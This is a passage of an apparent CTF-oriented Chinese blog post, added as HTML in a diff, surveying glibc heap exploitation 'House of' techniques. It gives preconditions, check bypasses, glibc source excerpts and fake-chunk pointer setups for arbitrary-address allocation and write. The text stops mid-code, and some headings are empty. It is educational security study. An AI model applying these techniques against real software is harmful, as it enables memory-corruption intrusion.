@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"a1ph0nse.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="堆的进阶利用，各种House层出不穷，但都是在基本的attck的基础上进行的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House of XXX">
+<meta property="og:url" content="https://a1ph0nse.github.io/2023/01/02/House%20Of%20XXX/index.html">
+<meta property="og:site_name" content="a1ph0nse">
+<meta property="og:description" content="堆的进阶利用，各种House层出不穷，但都是在基本的attck的基础上进行的。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-01-01T16:01:30.000Z">
+<meta property="article:modified_time" content="2023-03-17T14:47:34.000Z">
+<meta property="article:author" content="a1ph0nse">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="house_of_xxx">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://a1ph0nse.github.io/2023/01/02/House%20Of%20XXX/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>House of XXX | a1ph0nse</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">a1ph0nse</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个菜狗的挣扎</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a1ph0nse.github.io/2023/01/02/House%20Of%20XXX/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="a1ph0nse">
+      <meta itemprop="description" content="pwn菜狗、cs菜鸡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a1ph0nse">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          House of XXX
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-01-02 00:01:30" itemprop="dateCreated datePublished" datetime="2023-01-02T00:01:30+08:00">2023-01-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-17 22:47:34" itemprop="dateModified" datetime="2023-03-17T22:47:34+08:00">2023-03-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>堆的进阶利用，各种House层出不穷，但都是在基本的attck的基础上进行的。</p>
+<span id="more"></span>
+
+<h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><p>House of Spirit是一种针对fast bin的利用，通过在目标位置<strong>伪造</strong>fastbin chunk，并让其被释放，从而达到<strong>申请指定地址内存</strong>的目的。</p>
+<p>需要做的就是让目标位置能够被当作一个chunk释放，重点在于<strong>修改指定地址前后的内容使其能绕过free的检测</strong>。</p>
+<p>需要的绕过：</p>
+<ul>
+<li>fake chunk的<strong>ISMMAP位不能为1</strong>，因为 free 时，如果是mmap的chunk，会单独处理。</li>
+<li>fake chunk<strong>地址需要对齐</strong>。</li>
+<li>fake chunk的<strong>size大小需要满足对应的fastbin</strong> 的需求，同时也得<strong>对齐</strong>。</li>
+<li>fake chunk的next chunk的大小<strong>不能小于2 * SIZE_SZ</strong>，同时也<strong>不能大于av-&gt;system_mem</strong> 。</li>
+<li>fake chunk对应的fastbin<strong>链表头部不能是该fake chunk</strong>，即不能构成double free的情况。</li>
+</ul>
+<h3 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h3><p>House of Force是一种针对<strong>top chunk</strong>的利用，当bin中所有的free chunk都不能满足需求时，就会从top chunk中切割，只要切割后top chunk size&gt; MINSIZE，那么就可以切割top chunk分配。</p>
+<p>如果我们能通过一些方法<strong>控制top chunk的size和我们申请的chunk的大小</strong>，那么只要将<strong>top chunk size修改为一个足够大的值</strong>(如-1,unsigned long的最大值)，那么无论多大的size，我们都能分配到，由此实现<strong>任意地址分配</strong>。</p>
+<p>利用条件：</p>
+<ul>
+<li>可以控制top chunk的size</li>
+<li>可以控制申请chunk的大小</li>
+</ul>
+<h3 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h3><p>House of Einherjar是一种针对<strong>后向合并</strong>操作的利用。当一个chunk被释放时，free会首先会利用prev_inuse位检查其物理低地址的chunk是否空闲，如果空闲则会将这两个chunk合并，<strong>利用当前chunk P的指针、prev_size字段和size字段得到新的chunk的地址以及其大小</strong>。</p>
+<p>因此如果我们能<strong>控制prev_size字段和prev_inuse位</strong>，那么我们就可以将新的chunk指向几乎任何位置。而堆溢出、off by one(null)都可以达到这个条件。</p>
+<p>值得注意的是，在合并取出前一个chunk的时候会用到<strong>unlink</strong>，因此需要提前构造好fake chunk来绕过unlink的检查。</p>
+<p>在这里unlink的检查中主要要注意的是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查prev_size和size是否一致</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);     </span><br><span class="line"></span><br><span class="line"><span class="comment">//检查fd和bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>由于unlink中是利用要取出的chunk P进行验证，因此之后构造fake chunk的next chunk的prev_size即可绕过第一个检查。</p>
+<p>不过无论什么情况，第二个检查则需要构造一下。</p>
+<p>在利用unlink的时候，我们的绕过方式是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(fakeFD+<span class="number">0x18</span>)==P==*(fakeBK+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">//等价于(64bit)</span></span><br><span class="line">P-&gt;fd=&amp;P<span class="number">-0x18</span></span><br><span class="line">P-&gt;bk=&amp;P<span class="number">-0x10</span></span><br></pre></td></tr></table></figure>
+
+<p>但在这里我们可能不能获取到P的地址，所以我们换个方式:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd=P</span><br><span class="line">P-&gt;bk=P</span><br></pre></td></tr></table></figure>
+
+<p>同样可以绕过unlink的检查。</p>
+<p>值得注意的地方：</p>
+<ul>
+<li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li>
+<li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li>
+<li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li>
+</ul>
+<h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><p>House of Lore好像没什么例子，可能比较少见吧。House of Lore可以实现分配任意指定位置的chunk，从而修改任意地址的内存。利用的前提是需要<strong>控制Small Bin Chunk的bk指针</strong>，并且<strong>控制指定位置chunk的fd指针</strong>。</p>
+<p>主要利用的是small bin中的漏洞。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line"><span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>
+
+<p>当malloc的时候，如果申请的范围在small bin chunk内，且需要从small bin获取空闲的chunk时，会执行上面的语句。我们可以发现，如果我们能控制一个small bin chunk的bk指针指向fake chunk，并控制<strong>fake chunk的fd指向该small bin chunk</strong>来绕过检查，那么就可以将这个fake chunk放入small bin，下一次申请就可以申请到fake chunk1。</p>
+<h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><p>House of Orange核心就是<strong>通过漏洞利用获得free的效果</strong>（在没有free的程序中）。</p>
+<p>原理是当前堆的<strong>top chunk尺寸不足</strong>以满足申请分配的大小的时候，<strong>原来的top chunk会被释放并被置入unsorted bin中</strong>，通过这一点可以在没有free函数情况下获取到 unsorted bins。此时会<strong>执行sysmalloc来向系统申请更多的空间</strong>。但是对于堆来说有mmap和brk两种分配方式，我们需要<strong>让堆以brk的形式拓展</strong>，之后原有的top chunk会被置于unsorted bin中。</p>
+<p>为了达到目的，我们伪造top chunk size绕过一些检查。</p>
+<ul>
+<li>伪造的 size 必须要对齐到内存页(0x1000)</li>
+<li>size 要大于 MINSIZE(0x10)</li>
+<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
+<li>size 的 prev inuse 位必须为 1</li>
+</ul>
+<p>当然malloc申请的size也有要求：malloc 的尺寸不能大于mmp_.mmap_threshold（默认128K）</p>
+<p>top chunk size的对齐，top chunk addr + top chunk size后是一个4K对齐的地址（默认页面大小为4K，以4K对齐），因此伪造的top chunk size也要满足此条件，因此只能在原来的基础上增减4K的倍数。</p>
+<p>House of Orange的进一步利用与IO_FILE有关，后续再说。</p>
+<h3 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h3><p>House of Roman是fast bin attack和unsorted bin attack的结合。该技术用于bypass ALSR（即使有PIE也依旧有效），利用12-bit的爆破来达到获取shell的目的。且仅仅只需要<strong>一个UAF漏洞以及能创建任意大小的chunk</strong>的情况下就能完成利用。常用在没有泄露的程序中。</p>
+<p>主要步骤为：</p>
+<ol>
+<li><p>利用unsorted bin进行低地址覆盖，利用fastbin attack将fd指向malloc_hook-0x23来获取__malloc_hook（爆破）</p>
+</li>
+<li><p>利用unsorted bin attack修改malloc_hook为main_arena</p>
+</li>
+<li><p>利用之前获得的malloc_hook进行低位覆盖，修改malloc_hook为one_gadget</p>
+</li>
+</ol>
+<h3 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><p>一种在fast bin中伪造堆块的技术。其利用的是在进行malloc_consolidate时，fast bin中的堆块合并的过程中没有检查size。</p>
+<p>在chunk释放后，通过修改size构造fake chunk或修改fd指向fake chunk，之后通过malloc一个很大的内存，触发malloc_consolidate，由于这个过程中没有对size进行检查，因此fast bin中的chunk会放到对应的small bin中，伪造的fake chunk就变得合法了，由此可以实现overlapping</p>
+<p>不过需要伪造一下next chunk的prev_inuse=1和next next chunk的prev_inuse=1。</p>
+<h3 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h3><p>House of Corrosion利用了**<code>global_max_fast</code>**这个libc中的全局变量，<code>global_max_fast</code>表示最大的fastbin chunk的大小，默认为<code>0x80</code>，在没有初始化堆的情况下为<code>0</code>。改写<code>globla_max_fast</code>可以让程序将更大的chunk视作fast bin chunk，在malloc和free的时候将作为fast bin chunk处理。</p>
+<p><code>fastbinsY</code>中有10个元素，存放大小从<code>0x20~0xb0</code>的chunk，当超出该范围的chunk进入<code>fastbinsY</code>时，就会发生<strong>数组越界</strong>。利用此方法我们可以向<code>fastbinsY</code>后面的内存中写入一个堆地址（通过free），也可以取出后面内存中指针指向的chunk（如果可以malloc该size的话）。</p>
+<p>偏移和要处理的<code>chunk size</code>可以用此式子计算：<code>chunk size = (address-fastbinsY)* 2 + 0x20</code>（这个size包括了<code>header</code>），其中<code>chunk size</code>是处理的<code>chunk</code>的<code>size</code>，<code>address</code>是会写入或<code>malloc</code>的地址，<code>fastbinsY</code>为<code>fastbinsY</code>的地址。</p>
+<ol>
+<li><p><code>free</code>的利用：</p>
+<p> 利用<code>free</code>将<code>chunk</code>放入<code>fastbinsY</code>时的数组越界。当<code>global_max_fast</code>被修改变大后，更大的<code>chunk</code>被视为<code>fast bin chunk</code>，会被放入<code>fastbinsY</code>，如果大小超出<code>0xb0</code>，就会将后面对应的内存视作<code>fastbinsY</code>的一项放入，表现出的结果就是<strong>将释放的<code>chunk</code>的堆地址写入该内存</strong>。</p>
+<p> 值得注意的是，本质上这次写入是<code>fast bin chunk</code>进入<code>fast bin</code>的结果，因此该<code>chunk</code>的**<code>fd</code>位置会保存该内存处原有的指针，<code>chunk</code>的内容会被清空**。</p>
+</li>
+<li><p><code>malloc</code>的利用：</p>
+<p> <code>malloc</code>时更大的<code>chunk</code>被视作<code>fast bin</code>，因此首先在<code>fastbinsY</code>中对应的<code>fast bin</code>中取出<code>chunk</code>，如果大小超出<code>0xb0</code>，自然就会越界，在后面的内存中取出<code>chunk</code>。取出时，会<strong>判断后面内存中指针对应的<code>chunk</code>的<code>size</code>字段是否符合该<code>fast bin</code>的大小，如果符合则可以取出</strong>。</p>
+</li>
+</ol>
+<h3 id="House-of-Storm"><a href="#House-of-Storm" class="headerlink" title="House of  Storm"></a>House of  Storm</h3><p>House_of_storm 可以<strong>在任意地址写出chunk地址,进而把这个地址的高位当作size,可以进行任意地址分配chunk</strong>，也就是可以造成任意地址写。House_of_storm 虽然危害之大，但是其条件也是非常的苛刻。</p>
+<p>条件：</p>
+<ol>
+<li>glibc版本小于2.30,因为2.30之后加入了检查</li>
+<li>需要攻击者在 large_bin 和 unsorted_bin 中分别布置一个chunk 这两个chunk需要在<strong>归位之后处于同一个 largebin 的index中且 unsorted_bin 中的chunk要比 large_bin 中的大</strong></li>
+<li>unsorted bin中的bk指针要可控</li>
+<li>large bin中的bk和bk_nextsize指针要可控</li>
+</ol>
+<p>漏洞发生在unsorted bin chunk放入large bin的过程中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unsorted bin attack</span></span><br><span class="line"><span class="comment">//我们控制unsorted_chunk-&gt;bk = fake_chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsorted_chunks(av)-&gt;bk = fake_chunk</span></span><br><span class="line">unsorted_chunks(av)-&gt;bk = unsorted_chunk-&gt;bk;</span><br><span class="line"><span class="comment">//fake_chunk+0x10 = unsorted_bin</span></span><br><span class="line">bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line"><span class="comment">//放入fast bin的过程中</span></span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                	如果unsorted_chunk-&gt;size 大于 largbin_chunk-&gt;size，</span></span><br><span class="line"><span class="comment">                	把unsorted_chunk加入到纵向链表中</span></span><br><span class="line"><span class="comment">                	我们控制</span></span><br><span class="line"><span class="comment">                	large_chunk-&gt;bk = fake_chunk+0x8 </span></span><br><span class="line"><span class="comment">                	large_chunk-&gt;bk_nextsize=fake_chunk-0x18-5	</span></span><br><span class="line"><span class="comment">                  -5是因为堆地址常常是0x55或者0x56开头的，-5后可以将其写入size位，而0x56的size可以绕过malloc的检查申请出来</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                </span><br><span class="line">                 </span><br><span class="line">                unsorted_chunk-&gt;fd_nextsize = largbin_chunk;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//unsorted_chunk-&gt;bk_nextsize = fake_chunk-0x18-5</span></span><br><span class="line">                unsorted_chunk-&gt;bk_nextsize = largbin_chunk-&gt;bk_nextsize;</span><br><span class="line">                </span><br><span class="line">                largbin_chunk-&gt;bk_nextsize = unsorted_chunk;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//fake_chunk+0x3 = unsorted_chunk</span></span><br><span class="line">                unsorted_chunk-&gt;bk_nextsize-&gt;fd_nextsize = unsorted_chunk;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//bck  = fake_chunk+0x8</span></span><br><span class="line">            bck = largbin_chunk-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">mark_bin(av, unsorted_chunk_index); <span class="comment">//把unsorted_chunk加入到的bin的表示为非空</span></span><br><span class="line"><span class="comment">//把unsorted_chunk加入到large bin的链表中</span></span><br><span class="line"></span><br><span class="line">unsorted_chunk-&gt;bk = bck;</span><br><span class="line">unsorted_chunk-&gt;fd = largbin_chunk;</span><br><span class="line">largbin_chunk-&gt;bk = unsorted_chunk;</span><br><span class="line"><span class="comment">//fake_chunk+0x18 = unsorted_chunk</span></span><br><span class="line">bck-&gt;fd = unsorted_chunk;</span><br></pre></td></tr></table></figure>
+
+<p>具体利用：</p>
+<ol>
+<li>将unsorted bin chunk的bk指向为fake chunk</li>
+<li>将large bin中的bk指针指向fake chunk+0x8，bk_nextsize指向fake chunk-0x18-5（如果target为要写入的目标地址，则fake chunk为target-0x20），来实现victim-&gt;bk_nextsize-&gt;fd_nextsize=victim(实现fake chunk+3=victim) </li>
+<li>通过malloc(0x48)获得fake chunk,借此可以修改target处的内容</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsorted_bin_chunk-&gt;bk=fake_chunk</span><br><span class="line">large_bin_chunk-&gt;bk=fake_chunk+<span class="number">0x8</span></span><br><span class="line">large_bin_chunk-&gt;bk_nextsize=fake_chunk<span class="number">-0x18</span><span class="number">-5</span></span><br></pre></td></tr></table></figure>
+
+<p>其原理相当于利用large bin将一个堆地址写入任意地址，通过堆地址高位的0x56绕过检测，并将该fake chunk链入unsorted bin，从而实现任意地址malloc。</p>
+<h3 id="House-of-Kiwi"><a href="#House-of-Kiwi" class="headerlink" title="House of Kiwi"></a>House of Kiwi</h3><h3 id="House-of-Emma"><a href="#House-of-Emma" class="headerlink" title="House of Emma"></a>House of Emma</h3><h3 id="House-of-Pig"><a href="#House-of-Pig" class="headerlink" title="House of Pig"></a>House of Pig</h3><p>House of Pig 是一个将 Tcache Statsh Unlink+ Attack 和 FSOP 结合的攻击，同时使用到了 Largebin Attack 进行辅助。主要适用于 libc 2.31 及以后的新版本 libc 并且程序中仅有 calloc 时。</p>
+<p>需要存在 UAF。能执行 abort 流程或程序显式调用 exit 或程序能通过主函数返回。</p>
+<p>利用流程为</p>
+<ol>
+<li><p>进行一个 Tcache Stash Unlink+ 攻击，把地址 __free_hook - 0x10 写入 tcache_pthread_struct。由于该攻击要求__free_hook - 0x8 处存储一个指向可写内存的指针，所以在此之前需要进行一次 large bin attack。</p>
+</li>
+<li><p>再进行一个 large bin attack，修改 _IO_list_all 为一个堆地址，然后在该处伪造 _IO_FILE 结构体。</p>
+</li>
+<li><p>通过伪造的结构体触发 _IO_str_overflow getshell。</p>
+</li>
+</ol>
+<h3 id="House-of-Banana"><a href="#House-of-Banana" class="headerlink" title="House of Banana"></a>House of Banana</h3><p>从glibc 2.28开始，_int_malloc中增加了对unsorted bin的bk的校验，使得unsorted bin attack变得不可行。此时，我们可以考虑使用large bin attack，使用house of strom实现任意地址分配；然而，从glibc2.29开始，检查变得更加严格，house of strom不能用了。不过large bin attack仍可以使用，然而从glibc 2.30开始，常规large bin attack方法也被封堵，不过也能使用。</p>
+<h3 id="House-of-Apple"><a href="#House-of-Apple" class="headerlink" title="House of  Apple"></a>House of  Apple</h3><p>House of Apple在仅使用一次<code>largebin attack</code>并限制读写次数的条件下进行<code>FSOP</code>利用，前提均是已经泄露出<code>libc</code>地址和<code>heap</code>地址。</p>
+<p>使用<code>house of apple</code>的条件为：</p>
+<ol>
+<li>程序从<code>main</code>函数返回或能调用<code>exit</code>函数（触发调用链<code>exit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW</code>)</li>
+<li>能泄露出<code>heap</code>地址和<code>libc</code>地址</li>
+<li>能使用一次<code>largebin attack</code>（FSOP劫持<code>_IO_list_all</code>到伪造的<code>IO_FILE</code>结构体)</li>
+</ol>
+<p>在劫持IO后我们仍可以继续利用某些<code>IO</code>流函数去修改其他地方的值。就离不开<code>IO_FILE</code>的一个成员<code>_wide_data</code>的利用，其在<code>IO_FILE</code>中的偏移是<code>0xa0</code>。通过对伪造<code>_wide_data</code>并将vtable修改为<code>_IO_wstrn_jumps</code>，通过exit函数触发调用链<code>exit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW</code>，实现任意地址写已知（堆）地址（详情见IO_FILE）。</p>
+<p>House of Apple有四种利用思路：</p>
+<ol>
+<li>修改tcache线程变量为已知值，控制tcache bin的分配。</li>
+<li>修改<code>mp_.tcache_bins</code>为很大的值，使得很大的<code>chunk</code>也通过<code>tcachebin</code>去管理。</li>
+<li>修改<code>tls</code>结构体<code>pointer_guard</code>的值为已知值，走House of emma。</li>
+<li>修改<code>global_max_fast</code>全局变量，让大的chunk也能被认为是fast bin chunk。</li>
+</ol>
+<p>可以看到House of Apple主要还是利用<code>_wide_data</code>和<code>_IO_wstrn_jumps</code>中的<code>_IO_OVRFLOW</code>实现<strong>任意地址写已知地址</strong>，用以辅助其他方法劫持程序流。</p>
+<h3 id="House-of-Apple2"><a href="#House-of-Apple2" class="headerlink" title="House of  Apple2"></a>House of  Apple2</h3><p>House of Apple2也是基于劫持<code>_wide_data</code>的利用，与House of Apple的区别在只劫持<code>_wide_data</code>的条件能控制程序的执行流。</p>
+<p>使用<code>house of apple2</code>的条件为：</p>
+<ul>
+<li>已知<code>heap</code>地址和<code>glibc</code>地址</li>
+<li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li>
+<li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</li>
+</ul>
+<p>这次主要利用的是<code>_IO_wide_data</code>中的<code>_wide_vtable</code>，这也是一个虚表，某些函数的执行会调用到其中的函数，调用过程如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, 